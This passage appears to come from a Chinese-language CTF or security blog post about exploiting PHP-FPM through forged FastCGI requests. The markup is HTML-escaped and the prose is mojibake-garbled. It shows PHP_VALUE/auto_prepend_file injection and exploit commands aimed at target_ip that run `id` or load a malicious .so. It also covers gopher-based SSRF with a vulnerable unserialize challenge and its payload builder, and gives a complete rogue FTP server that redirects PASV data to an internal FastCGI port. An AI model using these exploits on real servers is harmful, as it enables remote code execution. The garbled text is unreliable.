&lt;span style="color:#75715e">/* Header */&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">version&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// ç‰ˆæœ¬
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// æœ¬æ¬¡recordçš„ç±»å‹
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚id
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// bodyä½“çš„å¤§å°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// é¢å¤–å—å¤§å°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">reserved&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">/* Body */&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">contentLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#111">FCGI_Record&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…ˆä»hederä¸­æ‹¿åˆ°bodyä½“å¤§å°ï¼ˆæœ€å¤§2^16=65535å­—èŠ‚ï¼‰ï¼Œå†ä»tcpæµé‡Œè¯»å–å¤§å°ç­‰äºcontentLenthçš„bodyï¼Œä¹‹åè¿˜æœ‰ä¸€éƒ¨åˆ†é¢å¤–çš„padding&lt;/p>
&lt;p>headerä¸­çš„typeèµ·åˆ°æŒ‡å®šrecordçš„ä½œç”¨ï¼Œå› ä¸ºFastCGIçš„å•ä¸ªrecordå¤§å°æœ‰é™ä½œç”¨å•ä¸€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªTCPæµä¸­ä¼ è¾“å¤šä¸ªrecordï¼Œé€šè¿‡typeæ¥æ ‡è¯†æ¯ä¸ªrecordçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼ŒrequestIdåšåˆ°åŒºåˆ†æ¯ä¸€æ¬¡çš„è¯·æ±‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112110643128.png" alt="image-20211112110643128">&lt;/p>
&lt;p>å½“type=4æ—¶ï¼Œè¡¨æ˜æ¶ˆæ¯ä¸­åŒ…å«çš„æ•°æ®ä¸ºæŸä¸ªname-valueå¯¹ï¼Œæ¯”å¦‚&lt;/p>
&lt;pre tabindex="0">&lt;code>{
'GATEWAY_INTERFACE': 'FastCGI/1.0',
'REQUEST_METHOD': 'GET',
'SCRIPT_FILENAME': '/var/www/html/index.php',
'SCRIPT_NAME': '/index.php',
'QUERY_STRING': '?a=1&amp;amp;b=2',
'REQUEST_URI': '/index.php?a=1&amp;amp;b=2',
'DOCUMENT_ROOT': '/var/www/html',
'SERVER_SOFTWARE': 'php/fcgiclient',
'REMOTE_ADDR': '127.0.0.1',
'REMOTE_PORT': '12345',
'SERVER_ADDR': '127.0.0.1',
'SERVER_PORT': '80',
'SERVER_NAME': &amp;quot;localhost&amp;quot;,
'SERVER_PROTOCOL': 'HTTP/1.1'
}
&lt;/code>&lt;/pre>&lt;p>å…¶ä¸­&lt;code>SCRIPT_FILENAME&lt;/code>å°±æ˜¯php-fpmä¼šå»æ‰§è¡Œçš„æ–‡ä»¶ï¼Œç”±äº5.3.9ç‰ˆæœ¬å¼•å…¥äº†&lt;code>security.limit_extensions&lt;/code>çš„é€‰é¡¹ï¼Œé»˜è®¤å¯¹åç¼€åé™åˆ¶åœ¨äº†phpå®¶æ—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘æ‰¾åˆ°å·²å­˜åœ¨phpæ–‡ä»¶ï¼ˆå®‰è£…æ—¶é™„å¸¦çš„phpæ–‡ä»¶ å¯ä»¥é€šè¿‡&lt;code>find / -name &amp;quot;*.php&amp;quot;&lt;/code>æ¥æœç´¢ä¸€ä¸‹é»˜è®¤ç¯å¢ƒ æ¯”å¦‚/usr/local/lib/php/PEAR.phpï¼‰ï¼Œå‘å…¶ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼›è€Œfpmæ”¯æŒé€šè¿‡è®¾ç½®&lt;code>FASTCGI_PARAMS&lt;/code>æ¥åŠ¨æ€ä¿®æ”¹phpçš„è®¾ç½®ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸¤é¡¹&lt;/p>
&lt;pre tabindex="0">&lt;code>'PHP_VALUE': 'auto_prepend_file = php://input',
'PHP_ADMIN_VALUE': 'allow_url_include = On'
&lt;/code>&lt;/pre>&lt;p>æ¥åšåˆ°æ‰§è¡ŒæŸphpæ–‡ä»¶æ—¶è‡ªåŠ¨åŒ…å«POSTå†…å®¹ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼ˆdisable_functionåœ¨phpåŠ è½½æ—¶å°±ç¡®å®šå¥½äº†ï¼Œæ— æ³•é‡å†™ï¼‰&lt;/p>
&lt;h2 id="æ”»å‡»æ€è·¯ä¾‹é¢˜">æ”»å‡»æ€è·¯&amp;amp;&amp;amp;ä¾‹é¢˜&lt;/h2>
&lt;p>ä¼ªé€ ä¸€ä¸ªå¯ä»¥æ­£å¸¸é€šä¿¡çš„FastCGIå®¢æˆ·ç«¯ï¼Œå°†ä¼ è¾“çš„å†…å®¹ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„æ¶æ„payloadï¼Œå†å‘å‡ºå»&lt;/p>
&lt;h3 id="è¿œç¨‹æ”»å‡»php-fpm">è¿œç¨‹æ”»å‡»php-fpm&lt;/h3>
&lt;p>è¿™é‡Œæ˜¯&lt;a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">pç‰›çš„è„šæœ¬&lt;/a>ï¼Œå…¼å®¹py2&amp;amp;3ï¼Œé»˜è®¤-p 9000ï¼Œ-c &lt;code>&amp;lt;?php phpinfo();?&amp;gt;&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python fpm.py target_ip /var/www/html/index.php -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬éœ€è¦æ”¹åŠ¨çš„åªæœ‰paramséƒ¨åˆ†çš„&lt;code>PHP_ADMIN_VALUE&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>'PHP_ADMIN_VALUE': 'allow_url_include = On\nextension = /home/amelia/TEMP/fpm/wuhu.so',
&lt;/code>&lt;/pre>&lt;p>æˆåŠŸ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175028236.png" alt="image-20211112175028236">&lt;/p>
&lt;p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœåªæ˜¯åŠ è½½æ¶æ„.soè€Œä¸æ‰§è¡Œä»£ç ï¼Œåˆ™å¹¶ä¸éœ€è¦æœ‰å·²å­˜åœ¨phpæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œç”¨&lt;code>_&lt;/code>å ä½å³å¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python fpm.py target_ip _ -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175353957.png" alt="image-20211112175353957">&lt;/p>
&lt;h3 id="ssrfæ”»å‡»æœ¬åœ°php-fpm">SSRFæ”»å‡»æœ¬åœ°php-fpm&lt;/h3>
&lt;p>åˆ©ç”¨&lt;code>gopher://&lt;/code>åè®®å¯ä»¥ç›´æ¥ä¼ è¾“TCPåè®®æµï¼Œæˆ‘ä»¬æ„é€ å¥½payloadä¹‹åå°±å¯ä»¥ä¼ å…¥è¿›è¡Œssrfæ”»å‡»äº†&lt;/p>
&lt;p>æ„é€ payloadä¾æ—§ä½¿ç”¨pç‰›çš„è„šæœ¬ï¼Œä¸è¿‡åšä¸€ç‚¹å¾®å°çš„æ”¹åŠ¨ï¼›è¿™éƒ¨åˆ†å¯ä»¥å‚è§åé¢ç»“åˆftpæ”»å‡»fpmçš„å†…å®¹ï¼Œæ€»ä¹‹å°±ç…§è¿™å‡ æ­¥èµ°&lt;/p>
&lt;ul>
&lt;li>pç‰›è„šæœ¬ç”Ÿæˆurlencodeä¹‹åçš„tcpæ•°æ®æµ&lt;/li>
&lt;li>åŠ gopher://127.0.0.1:9000å‰ç¼€&lt;/li>
&lt;li>æ¢­ï¼?url=gopher://127.0.0.1:9000/_xxxxxxxxxxxxxxxx&lt;/li>
&lt;/ul>
&lt;h4 id="å¼ºç½‘é’å°‘-2021ssrf">[å¼ºç½‘é’å°‘ 2021]SSRF&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">//like fpm?
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$ch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_HEADER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;login&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;crawldata&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#111">$crl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”¨pç‰›è„šæœ¬ç”Ÿæˆpayloadï¼Œç›´æ¥ssrfä¼ªåè®®å¥½åƒä¹Ÿè¡Œï¼Ÿæ²¡ç¯å¢ƒï¼Œäº‘ä¸€ä¸‹äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;gopher://127.0.0.1:9001/_xxxxxxxx&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;dict://127.0.0.1:80/info&amp;#34;;
&lt;/span>&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;file:///proc/net/arp&amp;#34;;
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°†åºåˆ—åŒ–ä¹‹åçš„ç»“æœä¼ å…¥crawldata&lt;/p>
&lt;h3 id="ç»“åˆftppasv-modeæ”»å‡»æœ¬åœ°php-fpm">ç»“åˆftp&amp;amp;PASV modeæ”»å‡»æœ¬åœ°php-fpm&lt;/h3>
&lt;h4 id="ftpä½¿ç”¨pasvæ¨¡å¼è½¬å‘ftp-data">ftpä½¿ç”¨PASVæ¨¡å¼è½¬å‘ftp-data&lt;/h4>
&lt;p>å…ˆç®€å•æµ‹è¯•ftpè¿æ¥è¿›è¡ŒæŠ“åŒ…&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112195819783.png" alt="image-20211112195819783">&lt;/p>
&lt;p>å…¶ä¸­çš„&lt;code>227 Entering Passive Mode (192,168,187,3,230,20)&lt;/code>çš„æ‹¬å·å†…çš„å†…å®¹è¡¨ç¤ºçš„æ˜¯ä¼ è¾“çš„FTP-DATAæ‰“å‘çš„ä½ç½®ï¼Œå‰ä¸€éƒ¨åˆ†æ˜¯ipï¼Œç«¯å£æ˜¯230*256+20=58900&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112200459682.png" alt="image-20211112200459682">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ–‡ä»¶å†…å®¹æ˜¯150okä¹‹åæ‰è¢«ä¼ å‡ºå»çš„ï¼Œè€Œä¸”ä¼šè¢«æ”¾åœ¨FTP-DATAä¸­è¢«ä¸Šä¼ å’Œä¸‹è½½&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿä¸€ä¸ªftp-serverï¼Œåœ¨å“åº”PASVå‘½ä»¤ï¼ˆå³passive åˆ‡æ¢è¢«åŠ¨æ¨¡å¼ï¼‰æ—¶è¿”å›&lt;code>(127,0,0,1,0,12345)&lt;/code>æ¥è®©FTP-DATAæ‰“å‘å†…ç½‘12345ç«¯å£ï¼›è¿™æ˜¯ä¸€ä¸ªæ¶æ„ftp-server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 192.168.187.1&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;215 UNIX Type: L8&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
